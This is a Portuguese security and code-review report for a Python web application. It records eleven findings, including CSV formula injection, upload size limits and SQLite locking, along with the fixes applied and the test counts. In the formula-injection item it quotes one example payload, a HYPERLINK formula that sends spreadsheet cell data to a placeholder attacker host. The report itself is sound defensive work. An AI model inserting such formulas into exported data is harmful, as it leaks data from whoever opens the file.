arquivo:
app/shared/exporter.py, app/shared/core/storage.py, app/shared/core/file_validators.py,
app/shared/core/exceptions.py, app/bootstrap/database.py, app/bootstrap/events.py, app/bootstrap/main.py

> ## ✅ DOCUMENTO FINALIZADO — 02/08/2026
> Todos os itens priorizados (Crítica 4/4, Média 6/6, Baixa 1/1 — parcial, ver nota) foram corrigidos ou
> verificados. Suíte completa final: **326 testes, 0 falhas** (baseline da etapa: 292). Esta é a última
> etapa do plano FABLE 5 — o apanhado final de todas as pendências conscientes acumuladas nas 5 etapas
> está em `docs/backlog/Fable5/Planejamento_revisao.md`.

---

## 📌 Status de Execução (02/08/2026)

**Todos os itens foram corrigidos ou verificados: Crítica 4/4, Média 6/6, Baixa 1/1.**

| Item | Prioridade | Status | Onde |
|---|---|---|---|
| #1 CSV/Formula Injection nos exportadores | 🔴 Crítica | ✅ CORRIGIDO | `exporter.py:_neutralizar_formula` |
| #2 SQLite sem `busy_timeout` suficiente | 🔴 Crítica | ✅ CONFIRMADO E CORRIGIDO | `database.py` — `busy_timeout=15000` |
| #3 Allowlist de upload divergente (5 fontes, não 4) | 🔴 Crítica | ✅ CORRIGIDO | fonte única em `file_validators.py` |
| #4 Sem validação de tamanho antes de materializar o upload | 🔴 Crítica | ✅ CORRIGIDO | `ler_upload_com_limite` (chunked) |
| #5 Escrita local bloqueia o event loop | 🟡 Média | ✅ CORRIGIDO | `asyncio.to_thread` |
| #6 Shutdown não aguarda tasks canceladas | 🟡 Média | ✅ CORRIGIDO | `asyncio.gather(..., return_exceptions=True)` |
| #7 Exportadores materializam tudo em memória | 🟡 Média | ✅ CORRIGIDO (parcial) | largura de coluna em passada única |
| #8 Handler global com prefixo do calendário ausente | 🟡 Média | ✅ CORRIGIDO | `API_PREFIXES` como fonte única, passada como parâmetro |
| #9 Nenhum handler para exceções não tratadas | 🟡 Média | ✅ CORRIGIDO | `@app.exception_handler(Exception)` |
| #10 `lru_cache` sem `cache_clear` acessível | 🟡 Média | ✅ VERIFICADO: JÁ DISPONÍVEL | `functools.lru_cache` já expõe nativamente |
| #11 Limpezas diversas | 🟢 Baixa | ✅ CORRIGIDO (parcial) | ver detalhamento |

**Arquivos alterados (consolidado — todas as prioridades):**
- `app/shared/exporter.py`, `app/shared/core/storage.py`, `app/shared/core/file_validators.py`
- `app/shared/core/exceptions.py`, `app/bootstrap/database.py`, `app/bootstrap/events.py`, `app/bootstrap/main.py`
- `app/modules/panes/service.py`, `app/modules/panes/router.py` (allowlist unificada, leitura com limite)
- `app/bootstrap/config/__init__.py` (nenhum campo novo nesta etapa)
- `tests/security/test_exporter_injection.py` (17 testes — novo)
- `tests/unit/test_storage_hardening.py` (11 testes — novo)
- `tests/unit/test_bootstrap_resiliencia.py` (5 testes — novo)
- `tests/test_exporter.py` (+1 teste)

**Suíte completa final:** `.venv\Scripts\pytest` → **326 testes, 0 falhas** (baseline: 292).

**Pendências conscientes que saem do escopo desta etapa** (documentadas, não bloqueiam o fechamento):
- `openpyxl.Workbook(write_only=True)` e `StreamingResponse` para reduzir o **pico de memória** dos
  exportadores (não só o CPU da largura de coluna, já resolvido) — adiado por exigir reescrever a
  estilização célula a célula, sem um problema de memória concretamente medido.
- `raise ValueError` em `storage.py` (5) e `bootstrap/config` (3) mantidos como estão — decisão
  consciente, são camadas de infraestrutura/configuração, não de domínio.
- `os.makedirs` em tempo de import e `app = create_app()` no nível do módulo em `main.py` — mudaria como
  a aplicação é importada em todo lugar; fora de proporção para um item 🟢 sem problema relatado.
- **Apanhado final de todas as pendências conscientes das 5 etapas** — ver
  `docs/backlog/Fable5/Planejamento_revisao.md`.

---

Relatorio:
Revisão de Código: app/shared/exporter.py, app/shared/core/storage.py, app/shared/core/file_validators.py,
app/shared/core/exceptions.py, app/bootstrap/database.py, app/bootstrap/events.py, app/bootstrap/main.py

🔴 Vulnerabilidades e Bugs Críticos

### [1] CSV/Formula Injection nos exportadores
- **Severidade:** 🔴 Crítica
- **Tipo:** Vulnerabilidade
- **Evidência:** `gerar_csv`/`gerar_xlsx` convertiam qualquer valor para string sem neutralizar
  caracteres que o Excel/LibreOffice interpretam como início de fórmula (`= + - @` e TAB/CR).
- **Vetor real:** os dados exportados vêm de campos livres preenchidos por usuários (descrição de pane,
  observações de inspeção). Um valor como `=HYPERLINK("http://atacante/?d="&A1,"clique")` executa no
  Excel de quem abrir o relatório exportado.
- **Correção Recomendada:** prefixar com apóstrofo toda célula cujo primeiro caractere seja um gatilho.
  **Aplicada** via `_neutralizar_formula(item)`, usada nas duas funções. Números (`int`/`float`) nunca
  são neutralizados — a checagem de tipo acontece antes da conversão para string, preservando negativos
  legítimos como `-5` sem apóstrofo, enquanto uma **string** `"-5"` (dado arbitrário de usuário) é
  neutralizada. 17 testes cobrindo os 4 gatilhos em CSV e XLSX.

### [2] SQLite sem busy_timeout suficiente para os escritores concorrentes atuais
- **Severidade:** 🔴 Crítica
- **Tipo:** Concorrência
- **Evidência:** o listener de conexão SQLite aplicava `foreign_keys`, `WAL` e `synchronous=NORMAL`, mas
  nenhum `busy_timeout` explícito.
- **Verificação experimental (script ad-hoc, 30 escritores concorrentes segurando `BEGIN IMMEDIATE` por
  0.3s cada):**
  - `busy_timeout=0` forçado: 29/30 falhas.
  - **Sem PRAGMA explícito (estado real do app antes da correção): 13/30 falhas** — achado refinado: o
    driver `sqlite3`/`aiosqlite` já aplica um `timeout=5.0s` default, então o app nunca esteve 100%
    desprotegido, mas 5s é insuficiente para o volume de escritores de fundo das Etapas 1-2.
  - `busy_timeout=15000`: 0/30 falhas.
- **Correção Recomendada:** `PRAGMA busy_timeout=15000` no listener existente. **Aplicada.**

### [3] Allowlist de upload divergente — 5 fontes de verdade, não 4
- **Severidade:** 🔴 Crítica
- **Tipo:** Vulnerabilidade / Arquitetura
- **Evidência:** `file_validators.py`, `storage.py` (Local e R2, duplicado 2x) e `panes/service.py`
  mantinham listas de extensões/MIME divergentes; uma 5ª "fonte" — o pipeline completo de conversão
  HEIC→JPEG em `app/shared/services/image/` — só apareceu ao investigar a fundo.
- **Achado concreto mais grave que a divergência em si:** `panes/router.py:upload_anexo` chama
  `file_validators.validate_file_upload` **antes** de qualquer código de `panes/service.py`. Como
  `file_validators` não reconhecia `.heic`/`.heif`, um upload real de foto HEIC (padrão do iPhone) era
  rejeitado com 422 nesse validador — o pipeline de conversão em `converter.py` era código **inalcançável**
  a partir do endpoint real, confirmado lendo a ordem de chamadas, não apenas inferido.
- **Correção Recomendada:** fonte única em `file_validators.py`. **Aplicada** — `ALLOWED_MIME_TYPES`
  ganhou HEIC/HEIF; `EXTENSOES_PERMITIDAS`/`MIMES_PERMITIDOS`/`EXTENSAO_MIME_MAP` derivados dele e
  importados por `storage.py` (perdeu `.doc`/`.docx`, nunca validados por magic bytes) e `panes/service.py`.

### [4] Ausência de validação de tamanho de upload antes de materializar em memória
- **Severidade:** 🔴 Crítica (DoS)
- **Tipo:** Vulnerabilidade
- **Evidência:** `panes/router.py` fazia `await arquivo.read()` sem limite algum; a checagem de tamanho
  existente em `panes/service.py` só rodava depois, já com o arquivo inteiro em RAM.
- **Correção Recomendada:** limite validado durante a leitura em chunks. **Aplicada:**
  `file_validators.ler_upload_com_limite(file, max_bytes)` lê em chunks de 1 MiB, abortando com
  `HTTPException(413)` assim que o total ultrapassa `settings.max_upload_size_mb` — sem nunca
  materializar mais que o limite mais um chunk. Teste simula stream de 50MB (sem alocar de fato) e
  confirma rejeição em <2s.

🟡 Problemas de Média Prioridade

### [5] Escrita de arquivo local bloqueia o event loop
- **Severidade:** 🟡 Média
- **Tipo:** Performance
- **Correção Recomendada:** `asyncio.to_thread`. **Aplicada** — mesmo padrão já usado por
  `R2StorageService._run_in_executor` ao lado.

### [6] Shutdown não aguarda o cancelamento das tasks de background
- **Severidade:** 🟡 Média
- **Tipo:** Robustez
- **Correção Recomendada:** `asyncio.gather(*tasks, return_exceptions=True)` após os `.cancel()`.
  **Aplicada.**

### [7] Exportadores materializam tudo em memória
- **Severidade:** 🟡 Média
- **Tipo:** Performance
- **Correção Recomendada:** a largura de coluna do XLSX era calculada numa segunda passada completa,
  relendo todas as células já escritas. **Corrigida** — acumulada durante a mesma passada de escrita
  (verificada por teste de equivalência com a fórmula anterior). O **pico de memória** do `Workbook`
  em si (`write_only=True`) e `StreamingResponse` para CSV **não foram aplicados** — exigiriam reescrever
  a estilização célula a célula, risco desproporcional sem um problema de memória medido.

### [8] Handler global de exceções com lista de prefixos hardcoded e desatualizada
- **Severidade:** 🟡 Média
- **Tipo:** Bug
- **Evidência:** o calendário (`/api/v1/calendario`) não estava na lista de prefixos de API — um 401/403
  ali, vindo de um cliente que aceitasse `text/html`, virava redirect 307 para `/login` em vez de JSON.
- **Correção Recomendada:** `setup_exception_handlers` passou a receber `api_prefixes` como parâmetro;
  `main.py` define `API_PREFIXES` (fonte única, ao lado de `_register_routers`) e a passa. **Aplicada.**

### [9] Nenhum handler para exceções não tratadas
- **Severidade:** 🟡 Média
- **Tipo:** Vulnerabilidade (information disclosure)
- **Correção Recomendada:** handler genérico de `Exception` → log com traceback no servidor + JSON 500
  genérico ao cliente. **Aplicada.**

### [10] `lru_cache` na fábrica de storage sem forma de resetar em testes
- **Severidade:** 🟡 Média (verificado como já resolvido)
- **Verificação feita:** `functools.lru_cache` já expõe `.cache_clear()` nativamente — nenhuma mudança
  de código foi necessária. Documentado e testado para uso futuro em fixtures.

🟢 Baixa Prioridade

### [11] Limpezas diversas
- **Severidade:** 🟢 Baixa
- **Correções aplicadas:** validação de path traversal (3 cópias idênticas) unificada em
  `file_validators.validar_nome_arquivo_seguro`; numeração de comentários em `events.py` corrigida;
  fallback silencioso de CORS agora loga um `warning`.
- **Verificado como falso-positivo:** `get_url` do storage local expõe caminho absoluto só server-side
  (usado para montar `FileResponse`), nunca serializado na resposta ao cliente.
- **Não aplicado (decisão consciente):** `raise ValueError` em `storage.py`/`bootstrap/config` mantidos
  (infraestrutura, não domínio); `os.makedirs`/`app = create_app()` em tempo de import não alterados
  (afetaria como a aplicação é importada em todo lugar, fora de proporção para um item 🟢).

---

## 📋 Plano de Ação (já executado nesta etapa)

| Fase | Prioridade | Itens |
|---|---|---|
| 1-2 | 🔴 Crítica | #1-#4 |
| 3-4 | 🟡 Média | #5-#10 |
| 4 | 🟢 Baixa | #11 |
| 5 | Consolidação | Este relatório + apanhado final das 5 etapas em `Planejamento_revisao.md` |

Detalhamento completo de cada fase, incluindo evidências de verificação, testes escritos e decisões de
escopo tomadas durante a execução, está em `docs/backlog/Fable5/Etapa5.md`.

---

## 🏁 Encerramento do Plano FABLE 5

Com esta etapa, as 5 etapas planejadas em `docs/backlog/Fable5/Planejamento_revisao.md` estão
concluídas. O apanhado final consolidando todas as pendências conscientes acumuladas ao longo das
Etapas 1-5 está registrado na seção final desse documento.
